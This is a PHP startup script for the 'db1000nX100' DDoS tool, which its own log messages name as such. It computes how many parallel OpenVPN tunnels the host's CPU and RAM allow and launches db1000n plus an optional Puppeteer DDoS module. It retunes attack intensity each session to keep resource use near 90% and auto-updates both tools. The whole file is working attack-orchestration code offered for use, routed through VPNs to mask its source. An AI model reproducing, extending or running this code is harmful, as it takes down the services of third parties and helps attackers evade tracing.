<?php

passthru('reset');
require_once __DIR__ . '/common.php';

global $TEMP_DIR, $NEW_DIR_ACCESS_MODE;
rmdirRecursive($TEMP_DIR);
@mkdir($TEMP_DIR, $NEW_DIR_ACCESS_MODE, true);

require_once __DIR__ . '/Config.php';
require_once __DIR__ . '/Efficiency.php';
require_once __DIR__ . '/resources-consumption/ResourcesConsumption.php';
require_once __DIR__ . '/open-vpn/OpenVpnConfig.php';
require_once __DIR__ . '/open-vpn/OpenVpnProvider.php';
require_once __DIR__ . '/open-vpn/OpenVpnConnection.php';
require_once __DIR__ . '/open-vpn/OpenVpnStatistics.php';
require_once __DIR__ . '/HackApplication.php';
require_once __DIR__ . '/DB1000N/db1000nApplication.php';
require_once __DIR__ . '/DB1000N/db1000nAutoUpdater.php';

$puppeteerApplicationPhp = __DIR__ . '/puppeteer-ddos/PuppeteerApplication.php';
if (file_exists($puppeteerApplicationPhp)) {
    require_once $puppeteerApplicationPhp;
}

//-------------------------------------------------------

$LOG_WIDTH = 115;
$LOG_PADDING_LEFT = 2;
$LOG_BADGE_WIDTH = 23;
$LOG_BADGE_PADDING_LEFT = 1;
$LOG_BADGE_PADDING_RIGHT = 1;
$LONG_LINE_WIDTH = $LOG_BADGE_WIDTH + 1 + $LOG_WIDTH;
$LONG_LINE       = str_repeat('─', $LONG_LINE_WIDTH);

$LONG_LINE_CLOSE = str_repeat(' ', $LOG_BADGE_WIDTH) . '│' . "\n"
                 . str_repeat('─', $LOG_BADGE_WIDTH) . '┴' . str_repeat('─', $LOG_WIDTH) . "\n";

$LONG_LINE_OPEN  = str_repeat('─', $LOG_BADGE_WIDTH) . '┬' . str_repeat('─', $LOG_WIDTH) . "\n"
                 . str_repeat(' ', $LOG_BADGE_WIDTH) . '│' . "\n";

$LONG_LINE_SEPARATOR = str_repeat(' ', $LOG_BADGE_WIDTH) . '│' . "\n"
                     . str_repeat('─', $LOG_BADGE_WIDTH) . '┼' . str_repeat('─', $LOG_WIDTH) . "\n"
                     . str_repeat(' ', $LOG_BADGE_WIDTH) . '│' . "\n";

$VPN_CONNECTIONS = [];
$SCRIPT_STARTED_AT = time();
$OS_RAM_CAPACITY    = bytesToGiB(ResourcesConsumption::getRAMCapacity());
$CPU_CORES_QUANTITY =            ResourcesConsumption::getCPUQuantity();
$VPN_QUANTITY_PER_CPU          = 10;
$VPN_QUANTITY_PER_1_GIB_RAM    = 12;
$DB1000N_SCALE_MAX             = 5;
$DB1000N_SCALE_MIN             = 0.01;
$DB1000N_SCALE_INITIAL         = 0.05;
$DB1000N_SCALE                 = $DB1000N_SCALE_INITIAL;

//----------------------------------------------

checkMaxOpenFilesLimit();
calculateResources();

//----------------------------------------------

function calculateResources()
{
    global
    $VPN_QUANTITY_PER_CPU,
    $VPN_QUANTITY_PER_1_GIB_RAM,
    $FIXED_VPN_QUANTITY,
    $IS_IN_DOCKER,
    $DOCKER_HOST,
    $OS_RAM_CAPACITY,
    $MAX_RAM_USAGE,
    $CPU_CORES_QUANTITY,
    $MAX_CPU_CORES_USAGE,
    $NETWORK_USAGE_LIMIT,
    $ONE_SESSION_MIN_DURATION,
    $ONE_SESSION_MAX_DURATION,
    $DELAY_AFTER_SESSION_MIN_DURATION,
    $DELAY_AFTER_SESSION_MAX_DURATION,
    $CPU_ARCHITECTURE,
    $PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL,
    $LOG_FILE_MAX_SIZE_MIB;

    if ($CPU_ARCHITECTURE !== 'x86_64') {
        MainLog::log("Cpu architecture $CPU_ARCHITECTURE");
    }

    $addToLog = [];
    //--

    $dockerHost = val(Config::$data, 'dockerHost');
    if ($dockerHost) {
        MainLog::log("Docker container in $dockerHost host");
        $IS_IN_DOCKER = true;
        $DOCKER_HOST = strtolower($dockerHost);
    } else {
        $IS_IN_DOCKER = false;
        $DOCKER_HOST = '';
    }

    //--

    $fixedVpnConnectionsQuantity = (int) val(Config::$data, 'fixedVpnConnectionsQuantity');
    if ($fixedVpnConnectionsQuantity) {
        $FIXED_VPN_QUANTITY = $fixedVpnConnectionsQuantity;
        $addToLog[] = "Fixed Vpn connections quantity: $FIXED_VPN_QUANTITY";
    }

    //--

    $cpuUsageLimit = (int) val(Config::$data, 'cpuUsageLimit');
    if ($cpuUsageLimit > 9  &&  $cpuUsageLimit < 100) {
        $MAX_CPU_CORES_USAGE = (int) round($cpuUsageLimit / 100 * $CPU_CORES_QUANTITY);
        $MAX_CPU_CORES_USAGE = max(0.5, $MAX_CPU_CORES_USAGE);
        $addToLog[] = "Cpu usage limit: $cpuUsageLimit%";
    } else {
        $MAX_CPU_CORES_USAGE = $CPU_CORES_QUANTITY;
    }

    //--

    $ramUsageLimit = (int) val(Config::$data, 'ramUsageLimit');
    if ($ramUsageLimit > 9  &&  $ramUsageLimit < 100) {
        $MAX_RAM_USAGE = roundLarge($ramUsageLimit / 100 * $OS_RAM_CAPACITY);
        $addToLog[] = "Ram usage limit: $ramUsageLimit%";
    } else {
        $MAX_RAM_USAGE = $OS_RAM_CAPACITY;
    }

    //--

    $networkUsageLimit = val(Config::$data, 'networkUsageLimit');
    if ($networkUsageLimit) {
        $valueInPercents = substr($networkUsageLimit, -1) === '%';
        $NETWORK_USAGE_LIMIT = (int) $networkUsageLimit;
        $message = "Network usage limit: $NETWORK_USAGE_LIMIT";
        if ($valueInPercents) {
            $message .= '%';
            $NETWORK_USAGE_LIMIT .= '%';
        } else {
            $message .= 'Mib';
        }
        $addToLog[] = $message;
    } else {
        $NETWORK_USAGE_LIMIT = '100%';
    }

    //--

    $logFileMaxSize = (int) val(Config::$data, 'logFileMaxSize');
    if ($logFileMaxSize > 0  &&  $logFileMaxSize < 2000) {
        $LOG_FILE_MAX_SIZE_MIB = $logFileMaxSize;
        if ($LOG_FILE_MAX_SIZE_MIB !== Config::$dataDefault['logFileMaxSize']) {
            $addToLog[] = "Log file max size: {$LOG_FILE_MAX_SIZE_MIB}MiB";
        }
        if (Config::$putYourOvpnFilesHerePath) {
            MainLog::moveLog(Config::$putYourOvpnFilesHerePath);
        }
    } else {
        $addToLog[] = "No log file";
        $LOG_FILE_MAX_SIZE_MIB = 0;
    }

    //--

    $oneSessionMinDuration = (int) val(Config::$data, 'oneSessionMinDuration');
    if ($oneSessionMinDuration < 180) {
        $oneSessionMinDuration = Config::$dataDefault['oneSessionMinDuration'];
    }
    if ($oneSessionMinDuration !== Config::$dataDefault['oneSessionMinDuration']) {
        $addToLog[] = "One session min duration: $oneSessionMinDuration seconds";
    }

    $oneSessionMaxDuration = (int) val(Config::$data, 'oneSessionMaxDuration');
    if ($oneSessionMaxDuration < 180) {
        $oneSessionMaxDuration = Config::$dataDefault['oneSessionMaxDuration'];
    }
    if ($oneSessionMaxDuration !== Config::$dataDefault['oneSessionMaxDuration']) {
        $addToLog[] = "One session max duration: $oneSessionMaxDuration seconds";
    }

    $ONE_SESSION_MIN_DURATION = $oneSessionMinDuration;
    $ONE_SESSION_MAX_DURATION = $oneSessionMaxDuration;

    //--

    $delayAfterSessionMinDuration = (int) val(Config::$data, 'delayAfterSessionMinDuration');
    if (!$delayAfterSessionMinDuration) {
        $delayAfterSessionMinDuration = Config::$dataDefault['delayAfterSessionMinDuration'];
    }
    if ($delayAfterSessionMinDuration !== Config::$dataDefault['delayAfterSessionMinDuration']) {
        $addToLog[] = "Delay after session min duration: $delayAfterSessionMinDuration seconds";
    }

    $delayAfterSessionMaxDuration = (int) val(Config::$data, 'delayAfterSessionMaxDuration');
    if (!$delayAfterSessionMaxDuration) {
        $delayAfterSessionMaxDuration = Config::$dataDefault['delayAfterSessionMaxDuration'];
    }
    if ($delayAfterSessionMaxDuration !== Config::$dataDefault['delayAfterSessionMaxDuration']) {
        $addToLog[] = "Delay after session max duration: $delayAfterSessionMaxDuration seconds";
    }

    $DELAY_AFTER_SESSION_MIN_DURATION = $delayAfterSessionMinDuration;
    $DELAY_AFTER_SESSION_MAX_DURATION = $delayAfterSessionMaxDuration;

    //--

    if (count($addToLog)) {
        MainLog::log("User defined settings:\n    " . implode("\n    ", $addToLog), 2);
    }

    //---

    if ($FIXED_VPN_QUANTITY) {
        MainLog::log("The user requested to establish $FIXED_VPN_QUANTITY VPN connection(s)");
        $PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL = $FIXED_VPN_QUANTITY;
    } else {
        $connectionsLimitByCpu = $MAX_CPU_CORES_USAGE * $VPN_QUANTITY_PER_CPU;
        MainLog::log("Allowed to use $MAX_CPU_CORES_USAGE of $CPU_CORES_QUANTITY installed CPU core(s). This grants $connectionsLimitByCpu parallel VPN connections");

        $connectionsLimitByRam = round(($MAX_RAM_USAGE - ($IS_IN_DOCKER  ?  0.25 : 0.75)) * $VPN_QUANTITY_PER_1_GIB_RAM);
        $connectionsLimitByRam = $connectionsLimitByRam < 1  ?  0 : $connectionsLimitByRam;
        MainLog::log("Allowed to use $MAX_RAM_USAGE of $OS_RAM_CAPACITY GiB installed RAM. This grants $connectionsLimitByRam parallel VPN connections");

        $vpnQuantityLimitPossibleValues = [
            'Limit by CPU'          => $connectionsLimitByCpu,
            'Limit by RAM'          => $connectionsLimitByRam
        ];
        $PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL = min($vpnQuantityLimitPossibleValues);
        $vpnQuantityLimitReason = array_search($PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL, $vpnQuantityLimitPossibleValues);

        MainLog::log("Script will try to establish $PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL parallel VPN connection(s). $vpnQuantityLimitReason");
    }

    if (!$PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL) {
        _die("Not enough resources");
    }

    MainLog::log('');
}

function initSession()
{
    global $SESSIONS_COUNT,
           $PARALLEL_VPN_CONNECTIONS_QUANTITY,
           $PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL,
           $CONNECT_PORTION_SIZE,
           $MAX_FAILED_VPN_CONNECTIONS_QUANTITY,
           $ONE_SESSION_MIN_DURATION,
           $ONE_SESSION_MAX_DURATION,
           $ONE_SESSION_DURATION,
           $DELAY_AFTER_SESSION_MIN_DURATION,
           $DELAY_AFTER_SESSION_MAX_DURATION,
           $DELAY_AFTER_SESSION_DURATION,
           $STATISTICS_BLOCK_INTERVAL,
           $CPU_CORES_QUANTITY,
           $MAX_CPU_CORES_USAGE,
           $OS_RAM_CAPACITY,
           $NETWORK_USAGE_LIMIT,
           $MAX_RAM_USAGE,
           $DB1000N_SCALE,
           $DB1000N_SCALE_MAX,
           $DB1000N_SCALE_MIN;

    $SESSIONS_COUNT++;
    ResourcesConsumption::startTaskTimeTracking('session');
    if ($SESSIONS_COUNT !== 1) {
        passthru('reset');  // Clear console
        //MainLog::newIteration();
    }

    MainLog::log("db1000nX100 DDoS script version " . SelfUpdate::getSelfVersion());
    MainLog::log("Starting $SESSIONS_COUNT session at " . date('Y/m/d H:i:s'));

    //-----------------------------------------------------------
    $PARALLEL_VPN_CONNECTIONS_QUANTITY   = $PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL;
    $MAX_FAILED_VPN_CONNECTIONS_QUANTITY = max(10, round($PARALLEL_VPN_CONNECTIONS_QUANTITY / 5));
    $CONNECT_PORTION_SIZE                = max(5,  round($PARALLEL_VPN_CONNECTIONS_QUANTITY / 2));
    $CONNECT_PORTION_SIZE                = min(60, $CONNECT_PORTION_SIZE);

    if ($SESSIONS_COUNT !== 1) {
        ResourcesConsumption::calculateNetworkBandwidthLimit(1, 2);

        $previousSessionSystemAverageCPUUsage = ResourcesConsumption::getSystemAverageCPUUsageFromStartToFinish();
        MainLog::log('System      average CPU     usage during previous session was ' . $previousSessionSystemAverageCPUUsage . "% of {$CPU_CORES_QUANTITY} core(s) installed");
        $previousSessionSystemAverageRamUsage = ResourcesConsumption::getSystemAverageRamUsageFromStartToFinish();
        MainLog::log('System      average RAM     usage during previous session was ' . $previousSessionSystemAverageRamUsage . "% of {$OS_RAM_CAPACITY}GiB installed");

        $previousSessionProcessesAverageCPUUsage = ResourcesConsumption::getProcessesAverageCPUUsageFromStartToFinish();
        MainLog::log('db1000nX100 average CPU     usage during previous session was ' . $previousSessionProcessesAverageCPUUsage . "% of {$MAX_CPU_CORES_USAGE} core(s) allowed");
        $previousSessionProcessesPeakRAMUsage = ResourcesConsumption::getProcessesPeakRAMUsageFromStartToFinish();
        MainLog::log('db1000nX100 peak    RAM     usage during previous session was ' . $previousSessionProcessesPeakRAMUsage . "% of {$MAX_RAM_USAGE}GiB allowed");

        $previousSessionUsageValues = [
            'SystemAverageCPUUsage'          => $previousSessionSystemAverageCPUUsage,
            'SystemAverageRamUsage'          => $previousSessionSystemAverageRamUsage,
            'db1000nX100AverageCPUUsage'     => $previousSessionProcessesAverageCPUUsage,
            'db1000nX100PeakRAMUsage'        => $previousSessionProcessesPeakRAMUsage
        ];

        if ($NETWORK_USAGE_LIMIT !== '100%') {
            ResourcesConsumption::getProcessesAverageNetworkUsageFromStartToFinish($db1000nX100AverageNetworkDownloadUsage, $db1000nX100AverageNetworkUploadUsage);
            if ($db1000nX100AverageNetworkDownloadUsage > 0  &&  $db1000nX100AverageNetworkUploadUsage > 0) {
                MainLog::log(
                      'db1000nX100 average network usage during previous session was: '
                    . "download $db1000nX100AverageNetworkDownloadUsage% of " . humanBytes(ResourcesConsumption::$receiveSpeedLimit,  HUMAN_BYTES_BITS) . ' allowed, '
                    . "upload $db1000nX100AverageNetworkUploadUsage% of "     . humanBytes(ResourcesConsumption::$transmitSpeedLimit, HUMAN_BYTES_BITS) . ' allowed'
                );

                $previousSessionUsageValues['db1000nX100AverageNetworkDownloadUsage'] = $db1000nX100AverageNetworkDownloadUsage;
                $previousSessionUsageValues['db1000nX100AverageNetworkUploadUsage']   = $db1000nX100AverageNetworkUploadUsage;
            }
        }

        $previousSessionHighestUsageValue       = max($previousSessionUsageValues);
        $previousSessionHighestUsageParameter   = array_search($previousSessionHighestUsageValue, $previousSessionUsageValues);
        MainLog::log("Previous session highest used resource was $previousSessionHighestUsageParameter " . Term::bold . "$previousSessionHighestUsageValue%" . Term::clear, 1, 1);

        $maxUsage = 98;
        $minUsage = 85;
        $goalUsage = 90;

        if ($previousSessionHighestUsageValue > $maxUsage) {
            $fitUsageToValue = $goalUsage;
        } else if (
                $previousSessionHighestUsageValue
            &&  $previousSessionHighestUsageValue < $minUsage
        ) {
            $fitUsageToValue = $goalUsage;
        } else {
            $fitUsageToValue = 0;
        }

        $previousSessionScale = $DB1000N_SCALE;
        if ($fitUsageToValue) {
            /* previousSessionScale -> $previousSessionHighestUsageValue
              ?currentSessionScale? -> $fitUsageToValue */
            $currentSessionScale = round($previousSessionScale * $fitUsageToValue / $previousSessionHighestUsageValue, 2);
            $currentSessionScale = min($currentSessionScale, $DB1000N_SCALE_MAX);
            $currentSessionScale = max($currentSessionScale, $DB1000N_SCALE_MIN);

            if ($currentSessionScale < $previousSessionScale) {
                MainLog::log("This resources usage was higher then $maxUsage%, decreasing db1000n scale value from $previousSessionScale to $currentSessionScale");
            } else if ($currentSessionScale > $previousSessionScale){
                MainLog::log("This resources usage was lower then $minUsage%, increasing db1000n scale value from $previousSessionScale to $currentSessionScale");
            }
            $DB1000N_SCALE = $currentSessionScale;
        }

    }

    MainLog::log("db1000n scale value $DB1000N_SCALE, range $DB1000N_SCALE_MIN-$DB1000N_SCALE_MAX", 1, 1);

    //-----------------------------------------------------------

    if ($SESSIONS_COUNT === 1  ||  $SESSIONS_COUNT % 10 === 0) {
        db1000nAutoUpdater::update();
        SelfUpdate::update();
    }

    OpenVpnConnection::newIteration();
    db1000nApplication::newIteration();
    if (class_exists('PuppeteerApplication')) {
        PuppeteerApplication::newIteration();
    }

    if ($SESSIONS_COUNT === 1) {
        MainLog::log("Reading ovpn files. Please, wait ...", 1);
        OpenVpnProvider::constructStatic();
        ResourcesConsumption::calculateNetworkBandwidthLimit(2);
    }

    $ONE_SESSION_DURATION = rand($ONE_SESSION_MIN_DURATION, $ONE_SESSION_MAX_DURATION);
    $STATISTICS_BLOCK_INTERVAL = intRound($ONE_SESSION_DURATION / 2);
    $DELAY_AFTER_SESSION_DURATION = rand($DELAY_AFTER_SESSION_MIN_DURATION, $DELAY_AFTER_SESSION_MAX_DURATION);
    MainLog::log('This session will last ' . humanDuration($ONE_SESSION_DURATION) . ', and after will be ' . humanDuration($DELAY_AFTER_SESSION_DURATION) . ' idle delay' , 2, 2);

    MainLog::log("Establishing $PARALLEL_VPN_CONNECTIONS_QUANTITY VPN connection(s). Please, wait ...");
}

function checkMaxOpenFilesLimit()
{
    $ulimitRequired = 65535;
    $ulimitSoft = (int) _shell_exec('ulimit -Sn');
    $ulimitHard = (int) _shell_exec('ulimit -Hn');
    $ulimit = min($ulimitSoft, $ulimitHard);
    if ($ulimit < $ulimitRequired) {
        _die("Increase open files limit from $ulimit to $ulimitRequired  (ulimit -n)");
    }
}

//xfce4-terminal  --maximize  --execute    /bin/bash -c "/root/DDOS/x100-suid-run.elf ;   read -p \"Program was terminated\""
